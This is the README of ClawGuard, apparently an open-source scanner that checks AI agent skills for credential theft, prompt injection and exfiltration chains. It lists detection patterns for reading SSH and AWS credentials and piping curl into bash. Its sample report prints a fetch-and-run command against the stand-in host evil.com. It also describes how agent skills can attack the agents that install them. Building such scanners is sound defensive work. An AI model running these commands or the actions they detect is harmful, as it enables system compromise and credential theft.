<![CDATA[<div align="center">

# 🛡️ ClawGuard

### Security Scanner for AI Agent Skills

**The first security tool built specifically for the agent internet.**

ClawGuard thinks like an attacker. It uses LLM-powered semantic analysis to catch threats that pattern matching misses — prompt injection, capability abuse, multi-skill attack chains, and more.

[![npm version](https://img.shields.io/npm/v/@dribgib/clawguard.svg?style=flat-square&color=22C55E)](https://www.npmjs.com/package/@dribgib/clawguard)
[![License: MIT](https://img.shields.io/badge/License-MIT-blue.svg?style=flat-square)](https://opensource.org/licenses/MIT)
[![GitHub](https://img.shields.io/github/stars/mikecavallo/clawguard?style=flat-square&color=yellow)](https://github.com/mikecavallo/clawguard)

```bash
npm install -g @dribgib/clawguard
```

</div>

---

## The Problem

AI agents install skills from the internet and give them access to your files, credentials, and system. Existing security tools weren't built for this:

- **Prompt injection** hides in natural language, not code
- **Capability abuse** looks legitimate until you understand intent
- **Multi-skill chains** combine innocent-looking skills into coordinated attacks
- **Social engineering** targets the agent itself, not your OS

A "weather skill" that reads `~/.ssh/id_rsa` won't trigger your antivirus. **ClawGuard catches it.**

---

## Quick Start

```bash
# Install
npm install -g @dribgib/clawguard

# Configure your LLM provider (one-time — powers semantic analysis)
clawguard config

# Scan a skill
clawguard scan ./my-skill

# Deep scan with dependency analysis
clawguard scan --deep ./my-skill

# Full audit — every analyzer at once
clawguard full ./my-skill
```

That's it. You'll get a risk score, findings, and remediation steps.

---

## What It Catches

### 🔍 Static Analysis — 36 Threat Patterns

Fast pattern matching across 6 categories:

| Category | Examples |
|----------|---------|
| **Credential Theft** | Reading `~/.ssh`, `~/.aws`, API keys, tokens |
| **Code Injection** | `eval()`, `exec()`, `curl \| bash`, dynamic imports |
| **Data Exfiltration** | Encoding + sending data to external endpoints |
| **Persistence** | Cron jobs, shell config modification, startup scripts |
| **Obfuscation** | Base64 encoding, hex strings, string concatenation tricks |
| **Privilege Escalation** | Sudo calls, permission changes, system file access |

### 🧠 Semantic Analysis — LLM-Powered Intent Detection

This is what makes ClawGuard different. It sends skill code to an LLM and asks: *"What is this actually trying to do?"*

Catches things patterns can't:
- **Capability-purpose mismatch** — "weather skill" accessing SSH keys
- **Prompt injection** — hidden instructions in SKILL.md files
- **Social engineering** — skills that manipulate the agent into dangerous actions
- **Delayed triggers** — attacks that only activate under specific conditions
- **Memory poisoning** — skills that corrupt the agent's memory/context

### ⛓️ Multi-Skill Attack Chains

Scans your entire skill library for dangerous combinations:

```
⛔ Attack Chain: Credential Staging Pipeline
   Skills: notes-manager → daily-digest

   Combines legitimate-looking file reading with legitimate-looking
   messaging to create a complete credential theft pipeline.
   Both skills appear helpful individually.
```

One skill reads credentials. Another skill sends messages. Alone they're fine. Together they're an exfiltration pipeline. ClawGuard finds these.

### 🔒 Behavioral Sandbox (Docker)

Runs skills in an isolated container with planted honeypot credentials:

1. Builds a Docker sandbox with fake `~/.ssh/id_rsa`, `~/.aws/credentials`, etc.
2. Executes the skill's scripts
3. Monitors file access, network calls, and command execution
4. If the skill touches honeypots → **definitive proof of malicious intent**

This catches attacks that only manifest at runtime — obfuscated code, conditional triggers, downloaded payloads.

### 🍯 Credential Access Detection

Standalone scanner for sensitive path access:
- SSH keys, AWS credentials, GCP/Azure tokens
- Environment variables, dotfiles, browser storage
- Generates honeypot placement recommendations

### 📊 Intent Graphs

Visualizes how data flows through a skill — sources, transforms, and sinks:

```bash
clawguard graph ./my-skill              # ASCII art
clawguard graph ./my-skill -f mermaid   # Mermaid diagram
```

---

## All Commands

| Command | What It Does |
|---------|-------------|
| `scan <path>` | Scan a single skill (local path or URL) |
| `full <path>` | Run ALL analyzers (static + semantic + honeypot + graph) |
| `library <path>` | Scan a skill library for multi-skill attack chains |
| `sandbox <path>` | Run behavioral sandbox with honeypot traps (requires Docker) |
| `honeypot <path>` | Scan for credential access patterns |
| `graph <path>` | Generate data flow intent graph |
| `config` | Configure LLM provider and API keys |
| `init` | Setup wizard |
| `ui` | Launch interactive terminal interface |
| `version` | Show version |

### Scan Options

```
clawguard scan <path> [options]

  -f, --fast          Static analysis only (skip semantic)
  -d, --deep          Deep dependency source analysis
  -s, --sandbox       Run behavioral sandbox (requires Docker)
  -o, --output <fmt>  Output format: md, json (default: md)
  -v, --verbose       Verbose output
  --api-key <key>     Override API key for this scan
  --keep              Keep downloaded files (when scanning URLs)
```

### Library Options

```
clawguard library <path> [options]

  -f, --fast          Pattern analysis only (skip semantic chains)
  -o, --output <fmt>  Output format: md, json
  -v, --verbose       Verbose output
```

---

## Configuration

```bash
clawguard config         # Interactive setup wizard
clawguard config --show  # View current config
clawguard config --test  # Test API connection
clawguard config --clear # Reset config
```

### Supported LLM Providers

| Provider | Models | Notes |
|----------|--------|-------|
| **Anthropic** | Claude Opus 4, Sonnet 4, Haiku 3.5 | Recommended — best at detecting intent |
| **OpenAI** | GPT-4o, GPT-4o Mini, GPT-4 Turbo | Great alternative |
| **Ollama** | Llama 3, Mixtral, etc. | Free, local, private |

Config is stored at `~/.config/clawguard/config.json`.

> **No API key?** ClawGuard still works — static analysis, attack chains, credential detection, and sandbox all run without an LLM. Semantic analysis just adds another layer.

---

## Example Output

```
┌─────────────────────────────────────────┐
│  ClawGuard Security Report              │
│  Skill: suspicious-helper               │
│  Risk Level: ⛔ CRITICAL (100/100)      │
└─────────────────────────────────────────┘

⛔ CRITICAL: Capability-Purpose Mismatch
   This skill claims to be "A helpful assistant" but accesses:
   ~/.ssh/id_rsa, ~/.aws/credentials, ~/.config/gh/hosts.yml
   Remediation: DO NOT INSTALL. This is malicious software.

⛔ CRITICAL: Data Exfiltration Pattern
   Reads credential files → base64 encodes → POSTs to external URL
   File: scripts/setup.sh (line 47)

⚠️  HIGH: Obfuscated Command
   Base64-decoded string executes: curl -s https://evil.com/c | bash
   File: src/helpers.js (line 112)

🟡 MEDIUM: Persistence Mechanism
   Adds entry to ~/.bashrc on install
   File: postinstall.sh (line 3)

── Summary ──────────────────────────────
   4 findings: 2 critical, 1 high, 1 medium
   Static: 3 findings | Semantic: 1 finding
   Verdict: ⛔ DO NOT INSTALL
```

---

## Exit Codes

| Code | Meaning |
|------|---------|
| `0` | ✅ Safe — no issues found |
| `1` | ⚠️ High risk findings |
| `2` | ⛔ Critical risk findings |

Use in CI/CD: `clawguard scan ./skill --fast -o json || exit 1`

---

## Use Cases

- **Before installing a skill** — scan it first
- **Audit your skill library** — find dangerous combinations you didn't know about
- **CI/CD pipeline** — gate skill installations on security scans
- **Skill marketplace moderation** — automated security review
- **Security research** — understand how agent attacks work

---

## Development

```bash
git clone https://github.com/mikecavallo/clawguard
cd clawguard
npm install
npm run build
npm run test
```

---

## How It Works

```
                    ┌──────────────┐
                    │  Skill Input │
                    └──────┬───────┘
                           │
              ┌────────────┼────────────┐
              ▼            ▼            ▼
        ┌──────────┐ ┌──────────┐ ┌──────────┐
        │  Static  │ │ Semantic │ │ Sandbox  │
        │ Analysis │ │ Analysis │ │ (Docker) │
        │ 36 rules │ │ LLM-pow. │ │ Honeypot │
        └────┬─────┘ └────┬─────┘ └────┬─────┘
             │             │            │
             └─────────────┼────────────┘
                           ▼
                  ┌─────────────────┐
                  │  Risk Scoring   │
                  │  & Remediation  │
                  └─────────────────┘
```

Each analyzer runs independently and contributes findings to a unified risk score. More analyzers = higher confidence.

---

## License

MIT — use it, fork it, protect your agents.

---

<div align="center">

**Built for the agent internet.** 🦞

[Website](https://github.com/mikecavallo/clawguard) · [Issues](https://github.com/mikecavallo/clawguard/issues) · [npm](https://www.npmjs.com/package/@dribgib/clawguard)

</div>
]]>